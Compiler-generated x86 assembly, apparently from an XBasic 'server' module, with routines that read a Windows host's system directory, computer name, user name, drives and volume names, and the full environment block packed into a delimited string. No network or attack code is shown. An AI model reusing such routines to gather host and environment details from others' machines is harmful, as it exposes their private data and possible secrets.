;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody1C.server:
;
; [3226] STRING buffer
#ifdef GetSystemDir.buffer
#undef GetSystemDir.buffer
#endif
#define GetSystemDir.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [3228] buffer = SPACE$(256)
	sub	esp,64			;;; i487
	mov	d[esp],256
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3229] ret = GetSystemDirectoryA (&buffer, 255)
#ifdef GetSystemDir.ret
#undef GetSystemDir.ret
#endif
#define GetSystemDir.ret ebp-44	; exposes local variable 'ret'
;
;
; [0] EXTERNAL FUNCTION GetSystemDirectoryA (lpBuffer, nSize)
	mov	eax,d[ebp-40]			;;; i642
; .xstk1C.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	255			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_GetSystemDirectoryA@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [3230] RETURN LEFT$(buffer, ret)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	jmp	end.func1C.server			;;; i258
;
; [3231] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetSystemDir.server:  ;;; Function end label for Assembly Programmers.
end.func1C.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1C.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func1C.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetSystemDir ()  *****
;  *****
;
; [3233] FUNCTION STRING GetComputerName()
.code
align 16
_GetComputerName.server@0:
;  *****
;  *****  FUNCTION  GetComputerName ()  *****
;  *****
func19.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func19.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody19.server:
;
; [3234] STRING buffer
#ifdef GetComputerName.buffer
#undef GetComputerName.buffer
#endif
#define GetComputerName.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [3236] len = 256
#ifdef GetComputerName.len
#undef GetComputerName.len
#endif
#define GetComputerName.len ebp-44	; exposes local variable 'len'
;
	mov	eax,256			;;; i659
	mov	d[ebp-44],eax			;;; i670
;
; [3237] buffer = NULL$(len)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3238] GetComputerNameA (&buffer, &len)
;
; [0] EXTERNAL FUNCTION GetComputerNameA (lpBuffer, nSize)
	mov	eax,d[ebp-40]			;;; i642
; .xstk19.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	lea	eax,[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	_GetComputerNameA@8			;;; i619
;
; [3239] RETURN TRIM$(buffer)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	jmp	end.func19.server			;;; i258
;
; [3240] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetComputerName.server:  ;;; Function end label for Assembly Programmers.
end.func19.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func19.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func19.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetComputerName ()  *****
;  *****
;
; [3242] FUNCTION STRING GetUserName()
.code
align 16
_GetUserName.server@0:
;  *****
;  *****  FUNCTION  GetUserName ()  *****
;  *****
func1A.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1A.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody1A.server:
;
; [3243] STRING buffer
#ifdef GetUserName.buffer
#undef GetUserName.buffer
#endif
#define GetUserName.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [3245] len = 256
#ifdef GetUserName.len
#undef GetUserName.len
#endif
#define GetUserName.len ebp-44	; exposes local variable 'len'
;
	mov	eax,256			;;; i659
	mov	d[ebp-44],eax			;;; i670
;
; [3246] buffer = NULL$(len)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3247] GetUserNameA (&buffer, &len)
;
; [0] EXTERNAL FUNCTION GetUserNameA (lpBuffer, nSize)
	mov	eax,d[ebp-40]			;;; i642
; .xstk1A.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	lea	eax,[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	_GetUserNameA@8			;;; i619
;
; [3248] RETURN LEFT$(buffer,len)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	jmp	end.func1A.server			;;; i258
;
; [3249] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetUserName.server:  ;;; Function end label for Assembly Programmers.
end.func1A.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1A.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func1A.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetUserName ()  *****
;  *****
;
; [3251] FUNCTION STRING GetDrivesB ()
.code
align 16
_GetDrivesB.server@0:
;  *****
;  *****  FUNCTION  GetDrivesB ()  *****
;  *****
func1E.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1E.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.478:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.478			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
funcBody1E.server:
;
; [3252] STRING buffer,drives,root,vname
#ifdef GetDrivesB.buffer
#undef GetDrivesB.buffer
#endif
#define GetDrivesB.buffer ebp-40	; exposes local variable 'buffer'
;
#ifdef GetDrivesB.drives
#undef GetDrivesB.drives
#endif
#define GetDrivesB.drives ebp-44	; exposes local variable 'drives'
;
#ifdef GetDrivesB.root
#undef GetDrivesB.root
#endif
#define GetDrivesB.root ebp-48	; exposes local variable 'root'
;
#ifdef GetDrivesB.vname
#undef GetDrivesB.vname
#endif
#define GetDrivesB.vname ebp-52	; exposes local variable 'vname'
;
;
; [3254] buffer = SPACE$(1024)
	sub	esp,64			;;; i487
	mov	d[esp],1024
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3255] ret = GetLogicalDriveStringsA (1023,&buffer)
#ifdef GetDrivesB.ret
#undef GetDrivesB.ret
#endif
#define GetDrivesB.ret ebp-56	; exposes local variable 'ret'
;
;
; [0] EXTERNAL FUNCTION GetLogicalDriveStringsA (nBufferLength, lpBuffer)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	1023			;;; i656a
	call	_GetLogicalDriveStringsA@8			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [3256] buffer = replace(LEFT$(buffer, ret),0,32)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
; .xstk1E.0000 = ebp-64	; internal variable
	mov	[ebp-64],eax			;;; i670
	push	32			;;; i656a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	call	func11.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3258] drives = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3259] DO
align 8
do.013E.server:
;
; [3260] root = GetTokenEx (@buffer,32,0)
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp-40]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-40],ecx			;;; i670
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3261] IF root THEN
	mov	eax,[ebp-48]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.013F.server			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.013F.server			;;; i218
;
; [3262] vname = NULL$(64)
	sub	esp,64			;;; i487
	mov	d[esp],64
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3263] GetVolumeInformationA (&root, &vname, 64, 0, 0, 0, 0, 0)
;
; [0] EXTERNAL FUNCTION GetVolumeInformationA (lpRootPathName, lpVolumeNameBuffer, nVolumeNameSize, lpVolumeSerialNumber, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, nFileSystemNameSize)
	mov	eax,d[ebp-48]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i642
; .xstk1E.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	64			;;; i656a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_GetVolumeInformationA@32			;;; i619
;
; [3264] drives = drives+root+" "+STRING$(GetDriveTypeA(&root))+" "+CSIZE$(vname)+","
	mov	eax,[ebp-44]			;;; i665
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-64],eax			;;; i670
	sub	esp,64			;;; i487
;
; [0] EXTERNAL FUNCTION GetDriveTypeA (nDrive)
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	call	_GetDriveTypeA@4			;;; i619
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-64]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-64],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,[ebp-52]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	mov	ebx,[ebp-64]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02C1.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3265] ELSE
	jmp	end.if.013F.server			;;; i107
else.013F.server:
;
; [3266] EXIT DO
	jmp	end.do.013E.server			;;; i144
;
; [3267] END IF
end.if.013F.server:
;
; [3268] LOOP WHILE (buffer !="")
do.loop.013E.server:
	mov	eax,[ebp-40]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
	jne	< do.013E.server			;;; i193
end.do.013E.server:
;
; [3270] RETURN drives
	mov	eax,[ebp-44]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func1E.server			;;; i258
;
; [3271] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetDrivesB.server:  ;;; Function end label for Assembly Programmers.
end.func1E.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1E.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func1E.server:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetDrivesB ()  *****
;  *****
;
; [3273] FUNCTION STRING GetDrives ()
.code
align 16
_GetDrives.server@0:
;  *****
;  *****  FUNCTION  GetDrives ()  *****
;  *****
func1D.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1D.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody1D.server:
;
; [3274] STRING buffer
#ifdef GetDrives.buffer
#undef GetDrives.buffer
#endif
#define GetDrives.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [3276] buffer = SPACE$(1024)
	sub	esp,64			;;; i487
	mov	d[esp],1024
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3277] ret = GetLogicalDriveStringsA (1023,&buffer)
#ifdef GetDrives.ret
#undef GetDrives.ret
#endif
#define GetDrives.ret ebp-44	; exposes local variable 'ret'
;
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	1023			;;; i656a
	call	_GetLogicalDriveStringsA@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [3278] RETURN replace(LEFT$(buffer, ret),0,32)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
; .xstk1D.0000 = ebp-52	; internal variable
	mov	[ebp-52],eax			;;; i670
	push	32			;;; i656a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func11.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
	jmp	end.func1D.server			;;; i258
;
; [3279] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetDrives.server:  ;;; Function end label for Assembly Programmers.
end.func1D.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1D.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func1D.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetDrives ()  *****
;  *****
;
; [3281] FUNCTION STRING GetEnvStrings ()
.code
align 16
_GetEnvStrings.server@0:
;  *****
;  *****  FUNCTION  GetEnvStrings ()  *****
;  *****
func18.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func18.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody18.server:
;
; [3282] STRING buffer,env
#ifdef GetEnvStrings.buffer
#undef GetEnvStrings.buffer
#endif
#define GetEnvStrings.buffer ebp-40	; exposes local variable 'buffer'
;
#ifdef GetEnvStrings.env
#undef GetEnvStrings.env
#endif
#define GetEnvStrings.env ebp-44	; exposes local variable 'env'
;
;
; [3285] env	= ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3286] addr = GetEnvironmentStrings()
#ifdef GetEnvStrings.addr
#undef GetEnvStrings.addr
#endif
#define GetEnvStrings.addr ebp-48	; exposes local variable 'addr'
;
;
; [0] EXTERNAL FUNCTION GetEnvironmentStrings ()
	call	_GetEnvironmentStrings@0			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [3287] IF addr THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0140.server			;;; i221
;
; [3288] DO
align 8
do.0141.server:
;
; [3289] IF (UBYTEAT(addr) != 0) THEN
	mov	esi,d[ebp-48]			;;; i665
	movzx	eax,b[esi]			;;; i491
	cmp	eax,0			;;; i684a
	je	>> else.0142.server			;;; i219
;
; [3290] buffer = CSTRING$(addr)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3291] IFZ env THEN
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.482			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0143.server			;;; i192
A.482:
;
; [3292] env = env + buffer
	mov	eax,[ebp-44]			;;; i665
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3293] ELSE
	jmp	end.if.0143.server			;;; i107
else.0143.server:
;
; [3294] env = env +"\1\2:"+ buffer
	mov	eax,[ebp-44]			;;; i665
	mov	ebx,addr @_string.0122.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3295] END IF
end.if.0143.server:
;
; [3296] addr = addr + SIZE(buffer)+1
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.483			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.483:
	mov	ebx,d[ebp-48]			;;; i665
	add	eax,ebx			;;; i775
	add	eax,1			;;; i775
	mov	d[ebp-48],eax			;;; i670
;
; [3297] END IF
else.0142.server:
end.if.0142.server:
;
; [3298] LOOP WHILE (UBYTEAT(addr) != 0)
do.loop.0141.server:
	mov	esi,d[ebp-48]			;;; i665
	movzx	eax,b[esi]			;;; i491
	cmp	eax,0			;;; i684a
	jne	< do.0141.server			;;; i193
end.do.0141.server:
;
; [3300] FreeEnvironmentStringsA(addr)
;
; [0] EXTERNAL FUNCTION FreeEnvironmentStringsA (lpsz)
	push	[ebp-48]			;;; i674a
	call	_FreeEnvironmentStringsA@4			;;; i619
;
; [3301] RETURN env
	mov	eax,[ebp-44]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func18.server			;;; i258
;
; [3302] ELSE
	jmp	end.if.0140.server			;;; i107
else.0140.server:
;
; [3303] RETURN ""
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func18.server			;;; i258
;
; [3304] END IF
end.if.0140.server:
;
; [3305] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetEnvStrings.server:  ;;; Function end label for Assembly Programmers.
end.func18.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func18.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func18.server:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetEnvStrings ()  *****
;  *****
;
; [3307] FUNCTION STRING replace (STRING text,oldc,newc)
.code
;
#ifdef replace.text
#undef replace.text
#endif
#define replace.text ebp+8	; exposes function argument 'text'
;
;
#ifdef replace.oldc
#undef replace.oldc
#endif
#define replace.oldc ebp+12	; exposes function argument 'oldc'
;
;
#ifdef replace.newc
#undef replace.newc
#endif
#define replace.newc ebp+16	; exposes function argument 'newc'
;
align 16
_replace.server@12:
;  *****
;  *****  FUNCTION  replace ()  *****
;  *****
func11.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody11.server:
;
; [3309] IFZ text THEN RETURN ""
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.487			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0144.server			;;; i192
A.487:
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func11.server			;;; i258
else.0144.server:
end.if.0144.server:
;
; [3310] FOR p = 0 TO SIZE(text)-1
#ifdef replace.p
#undef replace.p
#endif
#define replace.p ebp-40	; exposes local variable 'p'
;
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.488			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.488:
	sub	eax,1			;;; i791
; .forlimit11.0145 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
align 8
for.0145.server:
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0145.server			;;; i154
;
; [3311] IF (text{p} == oldc) THEN text{p} = newc
	mov	eax,d[ebp-40]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	ebx,d[ebp+12]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0146.server			;;; i219
	mov	eax,d[ebp+16]			;;; i665
	mov	ebx,d[ebp-40]			;;; i665
	mov	ecx,d[ebp+8]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i29
else.0146.server:
end.if.0146.server:
;
; [3312] NEXT p
do.next.0145.server:
	inc	d[ebp-40]			;;; i229
	jmp	for.0145.server			;;; i231
end.for.0145.server:
;
; [3313] RETURN text
	mov	eax,[ebp+8]			;;; i665
	call	%_clone.a0			;;; i870
